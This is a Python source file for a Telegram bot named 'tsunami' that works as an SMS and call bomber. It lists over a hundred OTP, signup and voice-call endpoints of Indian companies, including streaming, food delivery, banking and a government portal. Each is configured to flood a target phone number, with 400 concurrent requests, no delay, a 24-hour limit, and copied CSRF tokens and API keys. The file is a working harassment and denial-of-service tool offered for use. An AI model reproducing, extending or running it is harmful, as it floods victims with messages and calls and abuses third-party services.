import os
import sys
import time
import asyncio
import logging
import random
import uuid
import hmac
import hashlib
import base64
import json
from typing import Optional

import aiohttp
from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters,
)
from starlette.applications import Starlette
from starlette.responses import PlainTextResponse, Response
from starlette.routing import Route
import uvicorn

# ================== CONFIG ==================
BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
WEBHOOK_URL = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
PORT        = int(os.environ.get("PORT", 8000))

# ?? APNI TELEGRAM ID YAHAN DAALEIN
ADMIN_ID = 8959878185  

# SPEED CONFIG
CONCURRENCY     = 400              
DELAY           = 0.0              
REQUEST_TIMEOUT = 3                
MAX_DURATION    = 24 * 60 * 60     # 24 hours hard limit
# ============================================

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger("tsunami")

user_sessions: dict = {}
_http_session: Optional[aiohttp.ClientSession] = None
telegram_app: Optional[Application] = None


def is_valid_target(num: str) -> bool:
    return num.isdigit() and len(num) == 10 and num[0] in "6789"


# =========================================================================
#  ULTIMATE APIS (Old + New Merged)
# =========================================================================
def build_endpoints():
    UA_D = "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
    UA_C2 = "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36"
    E = []

    # ---------- 1. NEW APIS (From Hotstar, SonyLIV, Paytm, etc.) ----------
    E.append({"name":"Hotstar","method":"PUT","url":"https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp","headers":{"Host":"api.hotstar.com","content-type":"application/json","x-hs-platform":"PCTV","origin":"https://www.hotstar.com","User-Agent":UA_C2},"data":'{"phone_number":"{t}","country_prefix":"91"}'})
    E.append({"name":"AltBalaji","method":"POST","url":"https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN","headers":{"Accept":"application/json","X-API-KEY":"MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE","Content-Type":"application/json","Origin":"https://www.altbalaji.com","User-Agent":UA_C2},"data":'{"phone_number":"{t}","country_code":"91","platform":"web","exp":1601043289127}'})
    E.append({"name":"SonyLIV","method":"POST","url":"https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP","headers":{"Accept":"application/json","x-via-device":"true","origin":"https://www.sonyliv.com","User-Agent":UA_C2},"data":'{"channelPartnerID":"MSMIND","mobileNumber":"{t}","country":"IN","timestamp":"2020-09-24T14:03:03.505Z"}'})
    E.append({"name":"Medplus","method":"POST","url":"https://mobile.medplusindia.com/mobilemvc/profile/register.mbl","headers":{"Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.medplusmart.com","User-Agent":UA_C2},"data":"recieveUpdates=1&firstName=Tsunami&lastName=Bomber&emailId=tsunami%40gmail.com&password=U7d5iChk9ZWzrv%24&confirmpwd=U7d5iChk9ZWzrv%24&mobileNumber={t}&SESSIONID=18JG8XgX4yS3cCKk7Es11Fy4thL5fqHLWW&isCordova=false&isPhonepeSwitch=false"})
    E.append({"name":"Apollo","method":"POST","url":"https://webapi.apollo247.com/","headers":{"Authorization":"Bearer 18JG8XgX4yS3cCKk7Es11Fy4thL5fqHLWW","Content-Type":"application/json","Origin":"https://www.apollo247.com","User-Agent":UA_C2},"data":'{"operationName":"Login","variables":{"mobileNumber":"+91{t}","loginType":"PATIENT"},"query":"query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\\nstatus\\nmessage\\nloginId\\n__typename\\n  }\\n}\\n"}'})
    E.append({"name":"FBB","method":"POST","url":"https://www.fbbonline.in/customer/account/GenerateOtp","headers":{"X-Requested-With":"XMLHttpRequest","Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.fbbonline.in","User-Agent":UA_C2},"data":"YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={t}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=tsunami%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=hdhdhd&RegistrationForm%5Blast_name%5D=bsbdb&RegistrationForm%5Bpassword%5D=hdhdbfbfv&RegistrationForm%5Btc_opt_in%5D=on&validate_otp="})
    E.append({"name":"Grofers","method":"POST","url":"https://grofers.com/v2/accounts/","headers":{"device_id":"a11f656b-422e-4617-953b-c350d517467d","auth_key":"57546838840176547788289acae69dd58e49de36b8d924c34e4310ec45824e13","app_client":"consumer_web","Content-Type":"application/x-www-form-urlencoded","Origin":"https://grofers.com","User-Agent":UA_C2},"data":"user_phone={t}"})
    E.append({"name":"Zomato","method":"POST","url":"https://www.zomato.com/webroutes/auth/login","headers":{"x-zomato-csrft":"a6b0c09972b2bdd30c9c1b6552caee5d","Content-Type":"application/json","Origin":"https://www.zomato.com","User-Agent":UA_C2},"data":'{"country_id":1,"phone":"{t}","verification_type":"sms","method":"phone"}'})
    E.append({"name":"Dream11","method":"POST","url":"https://www.dream11.com/graphql/mutation/pwa/register","headers":{"device":"pwa","x-csrf":"fb1f1947-4547-392d-9a28-a9de30d9e766","Content-Type":"application/json","Origin":"https://www.dream11.com","User-Agent":UA_C2},"data":'{"query":"mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}","variables":{"email":"tsunami@gmail.com","mobileNumber":"{t}","password":"tsunami@123astronomia"}}'})
    E.append({"name":"Careers360","method":"POST","url":"https://www.careers360.com/ajax/no-cache/user/otp-send","headers":{"X-CSRFToken":"9tKY96jb358WKiZBMwhz2EcranwljWDbxdqrQCnvqQWXNGbIvtfEQQLCbrzA8ssj","X-Requested-With":"XMLHttpRequest","Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.careers360.com","User-Agent":UA_C2},"data":"mobile_number={t}&method=call&uid=12692588"})
    E.append({"name":"Gaana","method":"POST","url":"https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile","headers":{"channel":"gaana.com","platform":"android","Content-Type":"application/json","User-Agent":"Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019)","Host":"jsso1.indiatimes.com"},"data":'{"mobile":"+91-{t}"}'})
    E.append({"name":"Paytm","method":"POST","url":"https://accounts.paytm.com/v2/api/register","headers":{"Accept":"application/json","Origin":"https://accounts.paytm.com","Content-Type":"application/json","User-Agent":UA_C2},"data":'{"email":"","mobile":"{t}","loginPassword":"Pura@1090","csrfToken":"f7ea628c-91a2-5f14-82ca-6f7eee295b1d","redirectUri":"https://paytm.com/v1/api/authresponse","clientId":"paytm-web-secure","scope":"paytm","state":"","responseType":"code","theme":"mp-html5","dob_agreement":true}'})
    E.append({"name":"Ogonn","method":"POST","url":"https://ogonn.in/otp","headers":{"Origin":"https://ogonn.in","X-Requested-With":"XMLHttpRequest","Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_C2},"data":"_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={t}"})
    E.append({"name":"Swiggy_Signup","method":"POST","url":"https://www.swiggy.com/mapi/auth/signup","headers":{"Origin":"https://www.swiggy.com","__fetch_req__":"true","Content-Type":"application/json","User-Agent":UA_C2},"data":'{"name":"dbdbdbd","email":"tsunami@gmail.com","password":"sndndndbdj283jsbsbs","referral_code":"","mobile":"{t}","_csrf":"jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk"}'})
    E.append({"name":"Limeroad","method":"POST","url":"https://www.limeroad.com/auth/get_uuid_v2?ajax=true&ret=https://www.limeroad.com/myaccount/orders?ajax=true&mobileOnly=false&doAction=","headers":{"Origin":"https://www.limeroad.com","Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_C2},"data":"utf8=%E2%9C%93&authenticity_token=6686Dtpby7plpvjXr5%2Fe8oyPdiQ3Weta9Y9ydzSRP64%3D&user_id={t}"})
    E.append({"name":"Banggood","method":"POST","url":"https://m.banggood.in/index.php?com=login&t=sendMtSms&c=api","headers":{"X-Requested-With":"XMLHttpRequest","Content-Type":"application/x-www-form-urlencoded","Origin":"https://m.banggood.in","User-Agent":UA_C2},"data":"mobilePhone={t}&countryPhoneCode=91&type=1&verifyCode=KmUu"})
    E.append({"name":"UrbanClap","method":"POST","url":"https://www.urbanclap.com/api/v2/growth/profile/generateOTP","headers":{"x-device-os":"web","x-version-name":"web_v4.137.2","Content-Type":"application/json","Origin":"https://www.urbancompany.com","User-Agent":UA_C2},"data":'{"country_id":"IND","phone":{"isd_code":"+91","phone_wo_isd":"{t}"},"device_type":"customer"}'})
    E.append({"name":"Kotak","method":"POST","url":"https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_&SWNToken=1603857481489&flw=vkyc","headers":{"X-Requested-With":"XMLHttpRequest","Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.kotak.com","User-Agent":UA_C2},"data":"cust_full_name=Tsunami+Bomber&cust_email=tsunami%40gmail.com&cust_mobile={t}&cust_political_disclaimer=Yes&cust_fatca_disclaimer=Yes"})
    E.append({"name":"MakeMyTrip","method":"POST","url":"https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered?region=in&language=eng&currency=inr","headers":{"deviceid":"a3d2f892-af4d-40d1-808a-db6286b8fe1f","visitor-id":"a3d2f892-af4d-40d1-808a-db6286b8fe1f","Content-Type":"application/json","Origin":"https://www.makemytrip.com","User-Agent":UA_C2},"data":'{"loginId":"{t}","type":"MOBILE","version":2,"countryCode":"91"}'})
    E.append({"name":"Ola","method":"POST","url":"https://accounts.olacabs.com/api/login","headers":{"x-fingerprint-id":"3664542227","x-requested-with":"XMLHttpRequest","Content-Type":"application/json","Origin":"https://accounts.olacabs.com","User-Agent":UA_C2},"data":'{"mobileNumber":"{t}","dialingCode":"+91","countryCode":"IN"}'})
    E.append({"name":"Oyo","method":"POST","url":"https://www.oyorooms.com/api/pwa/generateotp?locale=en","headers":{"xsrf-token":"vsnr5ksR-bduQ9oz3foaxbqjfoLSnVIzFzY0","Content-Type":"text/plain;charset=UTF-8","Origin":"https://www.oyorooms.com","User-Agent":UA_C2},"data":'{"phone":"{t}","country_code":"+91","nod":4}'})
    E.append({"name":"BurgerKing","method":"POST","url":"https://consumer-apis.burgerking.in/api/v1/user/signUp","headers":{"appversion":"1.6","content-type":"application/json","platform":"web","Origin":"https://www.burgerking.in","User-Agent":UA_C2},"data":'{"phone_no":"{t}"}'})

    # ---------- 2. OLD APIS ----------
    E.append({"name":"Swiggy_Call","method":"POST","url":"https://profile.swiggy.com/api/v3/app/request_call_verification","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.swiggy.com"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"TataCapital_Voice","method":"POST","url":"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","isOtpViaCallAtLogin":"true"}'})
    E.append({"name":"1MG_Call","method":"POST","url":"https://www.1mg.com/auth_api/v6/create_token","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"number":"{t}","otp_on_call":true}'})
    E.append({"name":"MagicPin_Call","method":"POST","url":"https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/","headers":{"Content-Type":"application/json","auth-secret-key":"kQLMCQBrfevxhzuPpFWT","Origin":"https://magicpin.in","User-Agent":UA_D},"data":'{"phoneNumber":"91{t}","authMethod":"call","token":""}'})
    E.append({"name":"AjioLogin","method":"POST","url":"https://login.web.ajio.com/api/auth/generateLoginOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}"}'})
    E.append({"name":"AjioSignup","method":"POST","url":"https://login.web.ajio.com/api/auth/signupSendOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}","requestType":"SENDOTP","newDesign":false}'})
    E.append({"name":"BigBasketDaily","method":"POST","url":"https://bbdaily.bigbasket.com/bbd/ms/members/v2/sendotp","headers":{"Content-Type":"application/json","User-Agent":"BBD/Android/7.5.0/14"},"data":'{"identifier":"{t}","referrer":"unified_login"}'})
    E.append({"name":"Aakash","method":"POST","url":"https://antheapi.aakash.ac.in/api/generate-lead-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile_psid":"{t}","mobile_number":"","activity_type":"aakash-myadmission-signup","webengageData":{"profile":"student","whatsapp_opt_in":false,"method":"mobile"}}'})
    E.append({"name":"ConfirmTkt","method":"GET","url":"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={t}&newOtp=true&retry=false&hashOtp=true&fireBaseSMSvendor=karix&locale=en&channel=Android&appVersion=463&session={uuid}","headers":{"User-Agent":"okhttp/5.0.0-alpha.3"},"data":None})
    E.append({"name":"Housing","method":"POST","url":"https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&emittedFrom=client_buy_home","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"query":"mutation($phone: String) { sendOtp(phone: $phone) { success } }","variables":{"phone":"{t}"}}'})
    E.append({"name":"JarApp","method":"POST","url":"https://prod.myjar.app/v3/api/auth/requestOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D,"app-signature":"28f0a03fa7c891e812954517ca3d242e5e352018a707a42a9f2d06a9e1e0e674"},"data":'{"hasExperianConsent":true,"phoneNumber":"{t}","countryCode":"91"}'})
    E.append({"name":"My11Circle","method":"POST","url":"https://www.my11circle.com/api/fl/auth/v3/getOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"email":"","mobile":"{t}","whatsappAlerts":false}'})
    E.append({"name":"NykaaFashion","method":"POST","url":"https://www.nykaafashion.com/grahak-service/api/v1/auth/login/init?loginMethod=MOBILE_OTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileOrEmail":"{t}"}'})
    E.append({"name":"TVSMotor","method":"POST","url":"https://tvsconnectapi.tvsmotor.com/api/v3/UserLogin/Loginv3","headers":{"Content-Type":"application/json","User-Agent":"okhttp/5.0.0-alpha.2"},"data":'{"IsSuppressOTP":false,"MobileNumber":"{t}","otpLength":6}'})
    E.append({"name":"ZeptoSignup","method":"POST","url":"https://api.zepto.co.in/api/v1/user/customer/signup/","headers":{"Content-Type":"application/json","User-Agent":"okhttp/4.12.0"},"data":'{"signupType":"otp_sms","data":{"mobile_number":"{t}"}}'})
    E.append({"name":"ZestMoney","method":"POST","url":"https://app.zestmoney.in/zestlife/v2/Customer/GenerateOtp","headers":{"Content-Type":"application/json","User-Agent":"okhttp/4.9.1"},"data":'{"email":"","mobileNumber":"91{t}"}'})
    E.append({"name":"CountryDelight","method":"POST","url":"https://api.countrydelight.in/api/v1/customer/requestOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"x-source":"Android"},"data":'{"mobile_number":"{t}","new_user":true,"device":"Android","mode":"SMS"}', "hmac": True})
    E.append({"name":"Ding","method":"POST","url":"https://www.ding.com/PhoneLogin/OwnedPhoneNumber","headers":{"Content-Type":"application/json; charset=UTF-8"},"data":'{"phoneNumber":"{t}","countryDial":92}'})
    E.append({"name":"GrocerApp","method":"POST","url":"https://endpoints.grocerapps.com/v1/otp/generate","headers":{"Content-Type":"application/json"},"data":'{"phone_number":"{t}","type":"sms"}'})
    E.append({"name":"Udhaar","method":"POST","url":"https://web.udhaar.pk/udhaar/dukaan/create/sendotp/","headers":{"Content-Type":"application/json"},"data":'{"phone_number":"0{t}","referer":null,"version":"multi-business"}'})
    E.append({"name":"KPN_WA","method":"POST","url":"https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB","headers":{"Content-Type":"application/json"},"data":'{"phone_number":{"number":"{t}","country_code":"+91"}}'})
    E.append({"name":"MamaEarth_WA","method":"POST","url":"https://auth.mamaearth.in/v1/auth/initiate-signup","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"HeroFinCorp_WA","method":"POST","url":"https://loans.apps.herofincorp.com/api/generateOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","terms":true,"whatsapp":true}'})
    E.append({"name":"Refyne_WA","method":"POST","url":"https://prod-api.refyne.co.in/auth/v3/send-otp","headers":{"Content-Type":"application/json"},"data":'{"channel":"WHATSAPP","recipient":"{t}"}'})
    E.append({"name":"VisitApp_WA","method":"POST","url":"https://api.getvisitapp.com/v3/new-auth/login-phone","headers":{"Content-Type":"application/json"},"data":'{"channel":"whatsapp","resend":true,"countryCode":91,"phone":"{t}","platform":"WEB"}'})
    E.append({"name":"Lenskart","method":"POST","url":"https://api-gateway.juno.lenskart.com/v3/customers/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phoneCode":"+91","telephone":"{t}"}'})
    E.append({"name":"PharmEasy","method":"POST","url":"https://pharmeasy.in/api/v2/auth/send-otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Wakefit","method":"POST","url":"https://api.wakefit.co/api/consumer-sms-otp/","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"ShipRocket","method":"POST","url":"https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send","headers":{"Content-Type":"application/json"},"data":'{"mobileNumber":"{t}"}'})
    E.append({"name":"Khatabook","method":"POST","url":"https://api.khatabook.com/v1/auth/request-otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","app_signature":"wk+avHrHZf2"}'})
    E.append({"name":"RummyCircle","method":"POST","url":"https://www.rummycircle.com/api/fl/auth/v3/getOtp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","isPlaycircle":false}'})
    E.append({"name":"Apna","method":"POST","url":"https://production.apna.co/api/userprofile/v1/otp/","headers":{"Content-Type":"application/json"},"data":'{"hash_type":"original","phone_number":"91{t}","request_id":"{timestamp}","retries":0}'})
    E.append({"name":"BajajFinserv","method":"POST","url":"https://apigateway.bajajfinserv.in/apigateway/otp/sso","headers":{"Content-Type":"application/json"},"data":'{"mobileNumber":"{t}","source":"WEB"}'})
    E.append({"name":"Udaan","method":"POST","url":"https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":"mobile={t}"})
    E.append({"name":"OLX","method":"POST","url":"https://www.olx.in/api/auth/authenticate?lang=en-IN","headers":{"Content-Type":"application/json"},"data":'{"method":"sms","phone":"{t}","language":"en-IN","grantType":"retry"}'})
    E.append({"name":"JioSaavn","method":"POST","url":"https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0","headers":{"Content-Type":"application/json"},"data":'{"phone_number":"+91{t}"}'})
    E.append({"name":"Licious","method":"POST","url":"https://www.licious.com/auth/api/v1/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","countryCode":"+91"}'})
    E.append({"name":"Groww","method":"POST","url":"https://groww.in/api/v2/auth/otp/send","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","platform":"WEB"}'})
    E.append({"name":"RedBus","method":"POST","url":"https://www.redbus.in/api/v2/auth/otp/send","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","source":"web"}'})
    E.append({"name":"Dominos","method":"POST","url":"https://pizzaonline.dominos.co.in/api/v2/customer/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"McDelivery","method":"POST","url":"https://mcdelivery.mcdonaldsindia.com/api/customer/sendOTP","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"KFC","method":"POST","url":"https://online.kfc.co.in/api/customer/otp/generate","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"BigBasket","method":"POST","url":"https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/","headers":{"Content-Type":"application/json"},"data":'{"mobile_number":"{t}"}'})
    E.append({"name":"Blinkit","method":"POST","url":"https://api.grofers.com/v5/otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Zepto","method":"POST","url":"https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/","headers":{"Content-Type":"application/json"},"data":'{"mobileNumber":"{t}"}'})
    E.append({"name":"JioMart","method":"POST","url":"https://www.jiomart.com/api/v1/user/send-otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Snapdeal","method":"POST","url":"https://www.snapdeal.com/authenticate/otp/send","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Ajio","method":"POST","url":"https://www.ajio.com/api/otp/generate","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Myntra","method":"POST","url":"https://www.myntra.com/gw/mobile-auth/otp/generate","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Meesho","method":"POST","url":"https://www.meesho.com/api/v1/otp/send","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"EaseMyTrip","method":"POST","url":"https://www.easemytrip.com/api/otp/SendOtp","headers":{"Content-Type":"application/json"},"data":'{"Mobileno":"{t}","Type":"M"}'})
    E.append({"name":"KreditBee","method":"POST","url":"https://api.kreditbee.in/api/v2/auth/otp/send","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Netmeds","method":"POST","url":"https://www.netmeds.com/api/v2/auth/login/send-otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Unacademy","method":"POST","url":"https://unacademy.com/api/v2/user/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Purplle","method":"POST","url":"https://www.purplle.com/api/v2/auth/send-otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Cultfit","method":"POST","url":"https://www.cult.fit/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Housing_SMS","method":"POST","url":"https://login.housing.com/api/v2/send-otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","country_url_name":"in"}'})
    E.append({"name":"PropTiger","method":"POST","url":"https://www.proptiger.com/api/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Practo","method":"POST","url":"https://www.practo.com/api/v2/auth/send-otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"HealthKart","method":"POST","url":"https://www.healthkart.com/api/customer/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Cars24","method":"POST","url":"https://www.cars24.com/api/v2/auth/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"CarDekho","method":"POST","url":"https://www.cardekho.com/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"MagicBricks","method":"POST","url":"https://www.magicbricks.com/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"99acres","method":"POST","url":"https://www.99acres.com/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"NoBroker_2","method":"POST","url":"https://www.nobroker.in/api/v4/account/otp/send","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":"phone={t}&countryCode=IN"})
    E.append({"name":"MamaEarth_SMS","method":"POST","url":"https://auth.mamaearth.in/v1/auth/sms-otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"PlumGoodness","method":"POST","url":"https://www.plumgoodness.com/api/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Biotique","method":"POST","url":"https://www.biotique.com/api/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"HealthifyMe","method":"POST","url":"https://api.healthifyme.com/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"UMANG","method":"POST","url":"https://web.umang.gov.in/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Jio","method":"POST","url":"https://www.jio.com/api/jio-login-service/login/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"mobileNumber":"{t}","loginFlowType":"MOBILE","alternateNumber":""}'})
    E.append({"name":"Porter","method":"POST","url":"https://api.porter.in/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Delhivery","method":"POST","url":"https://www.delhivery.com/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"BookMyShow","method":"POST","url":"https://in.bookmyshow.com/auth/send/otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"PVR","method":"POST","url":"https://www.pvrcinemas.com/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Voot_CheckUser","method":"POST","url":"https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"type":"mobile","mobile":"{t}","countryCode":"+91"}'})
    E.append({"name":"InstaCash_OTP","method":"POST","url":"https://getinstacash.in/sell/getData.php","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"type=sendOTP&mobile={t}"})
    E.append({"name":"Snapdeal_Signup","method":"POST","url":"https://m.snapdeal.com/signupCompleteAjax","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"j_mobilenumber={t}&agree=true&journey=mobile&swp=true"})
    E.append({"name":"Cuemath_Parent","method":"POST","url":"https://www.cuemath.com/api/v4/parents/","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","email":"","full_name":"","place_id":""}'})
    E.append({"name":"Doubtnut_Login","method":"POST","url":"https://doubtnut.com/api/v1/user/login","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"phone={t}"})
    E.append({"name":"Vedantu_PreLogin","method":"POST","url":"https://user.vedantu.com/user/preLoginVerification","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phoneCode":"+91","phoneNumber":"{t}","ver":"11.345"}'})
    E.append({"name":"Byjus_SendOtp","method":"POST","url":"https://bcas-prod.byjusweb.com/api/send-otp","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"phoneNumber={t}&page=free-trial-classes"})
    E.append({"name":"Redbus_GetOtp","method":"GET","url":"https://m.redbus.in/api/getOtp?number={t}&cc=91&whatsAppOpted=undefined","headers":{"User-Agent":UA_D},"data":None})
    E.append({"name":"Coolwinks_Check","method":"GET","url":"https://api.coolwinks.com/api/accounts/is_already_registered/?username={t}","headers":{"User-Agent":UA_D},"data":None})
    E.append({"name":"Cansell_Signup","method":"POST","url":"https://webapi.cansell.in/api/User/SignUp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"name":"","email":"","phone":"{t}","password":""}'})
    E.append({"name":"Flipkart_Login","method":"POST","url":"https://1.rome.api.flipkart.com/1/action/view","headers":{"Content-Type":"application/json","x-user-agent":UA_D},"data":'{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginId":"{t}"}}'})
    E.append({"name":"Ullu_SendOtp","method":"POST","url":"https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={t}","headers":{"User-Agent":"okhttp/4.9.0"},"data":None})
    E.append({"name":"Aakash_Digital","method":"POST","url":"https://digital.aakash.ac.in/signup-otp-verify","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"mobileval={t}"})
    E.append({"name":"Cilory_Auth","method":"POST","url":"https://www.cilory.com/app/w/auth/soft","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"BookMyShow_PWA","method":"POST","url":"https://in.bookmyshow.com/pwa/api/uapi/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"channel":"phone","subChannel":"sms","details":{"phone":"{t}"}}'})
    E.append({"name":"Flomattress_OTP","method":"POST","url":"https://cod.flomattress.com/api/otp","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"number={t}&store=hushbedding.myshopify.com"})
    E.append({"name":"Lenskart_v2","method":"POST","url":"https://api.lenskart.com/v2/customers/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"x-api-client":"mobilesite"},"data":'{"telephone":"{t}"}'})
